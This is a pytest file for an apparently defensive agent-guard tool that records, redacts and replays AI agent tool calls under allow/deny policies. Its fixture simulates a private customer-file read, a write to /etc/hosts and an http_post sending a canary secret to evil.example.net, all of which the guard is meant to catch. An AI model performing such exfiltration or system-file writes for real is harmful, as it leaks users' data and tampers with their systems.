import json
from pathlib import Path

import pytest
import yaml

from agentblackbox.canary import CanarySet
from agentblackbox.cli import main
from agentblackbox.guard import Guard
from agentblackbox.mocktools import MockEnv
from agentblackbox.policy import load_policy, parse_policy
from agentblackbox.recorder import Recorder
from agentblackbox.replay import replay_events, replay_trace
from agentblackbox.scenario import load_scenarios, run_scenario

ROOT = Path(__file__).resolve().parent.parent
DEFAULT = load_policy(ROOT / "policies" / "default.yaml")
STRICT = load_policy(ROOT / "policies" / "strict.yaml")


def record_session(path, policy=DEFAULT, mode="monitor"):
    """A short story recorded in monitor mode so every call actually runs."""
    canaries = CanarySet(1)
    env = MockEnv()
    canaries.plant(env)
    rec = Recorder(path, session_id="story", canaries=canaries.literals())
    guard = Guard(policy, recorder=rec, mode=mode, canaries=canaries)
    guard.tools.update(env.tools())
    guard.call("read_file", {"path": "workspace/private/customers.csv"})
    guard.call("http_get", {"url": "https://api.github.com/repos/x/y"})
    guard.call("shell", {"command": "git status"})
    guard.call("write_file", {"path": "/etc/hosts", "content": "x"})
    guard.call("http_post", {"url": "https://evil.example.net/in", "body": canaries.literals()[0]})
    rec.close()
    return path


def test_same_policy_replays_every_dev_scenario_identically():
    """The strongest check: redacted traces must still evaluate to the live decisions."""
    for s in load_scenarios(ROOT / "scenarios" / "dev"):
        result = run_scenario(s, DEFAULT)
        report = replay_events(result.trace, DEFAULT)
        assert report.counts["unchanged"] == len(report.rows), (
            s.id,
            [r for r in report.rows if r.change != "unchanged"],
        )


def test_strict_policy_denies_more(tmp_path):
    path = record_session(tmp_path / "t.jsonl")
    report = replay_trace(path, STRICT)
    changed = {r.seq: r for r in report.rows if r.change != "unchanged"}
    # strict forbids private reads outright and also the shell tool
    assert changed[0].change == "newly_denied" and "fs.private.no_read" in changed[0].new_rules
    assert any(r.tool == "shell" and r.change == "newly_denied" for r in report.rows)
    assert report.counts["newly_denied"] >= 2 and report.integrity_ok


def test_permissive_policy_allows_previous_denials(tmp_path):
    path = record_session(tmp_path / "t.jsonl")
    permissive = parse_policy(yaml.safe_load("version: 1\ndefault: allow\n"))
    report = replay_trace(path, permissive)
    assert report.counts["newly_allowed"] == 1  # only the /etc/hosts write
    assert report.counts["newly_denied"] == 0
    # The canary post stays denied: canary.exfil cannot be policy-ed away.
    canary_row = report.rows[-1]
    assert canary_row.new == "deny" and canary_row.new_rules == ["canary.exfil"]


def test_replay_flags_tampered_trace(tmp_path):
    path = record_session(tmp_path / "t.jsonl")
    path.write_text(path.read_text().replace('"allow"', '"deny"', 1))
    assert not replay_trace(path, DEFAULT).integrity_ok


def test_result_events_are_not_replayed(tmp_path):
    path = record_session(tmp_path / "t.jsonl")
    report = replay_trace(path, DEFAULT)
    assert len(report.rows) == 5


def test_cli_replay_text_and_json(tmp_path, capsys):
    path = record_session(tmp_path / "t.jsonl")
    assert main(["replay", str(path), "--policy", str(ROOT / "policies" / "strict.yaml")]) == 0
    out = capsys.readouterr().out
    assert "newly denied" in out and "unchanged" in out and "fs.private.no_read" in out
    assert (
        main(["replay", str(path), "--policy", str(ROOT / "policies" / "strict.yaml"), "--json"])
        == 0
    )
    data = json.loads(capsys.readouterr().out)
    assert data["counts"]["newly_denied"] >= 2


def test_cli_replay_bad_policy(tmp_path, capsys):
    path = record_session(tmp_path / "t.jsonl")
    bad = tmp_path / "bad.yaml"
    bad.write_text("version: 9\n")
    assert main(["replay", str(path), "--policy", str(bad)]) == 2
    assert "version" in capsys.readouterr().err


@pytest.mark.parametrize("variant", ["reversed", "base32", "hex"])
def test_recorder_never_stores_any_canary_encoding(tmp_path, variant):
    import base64

    canaries = CanarySet(1)
    tok = canaries.literals()[0]
    body = {
        "reversed": tok[::-1],
        "base32": base64.b32encode(tok.encode()).decode(),
        "hex": tok.encode().hex(),
    }[variant]
    rec = Recorder(tmp_path / "t.jsonl", session_id="s", canaries=canaries.literals())
    rec.append(kind="call", tool="http_post", args={"body": body}, decision="deny")
    assert body not in (tmp_path / "t.jsonl").read_text()
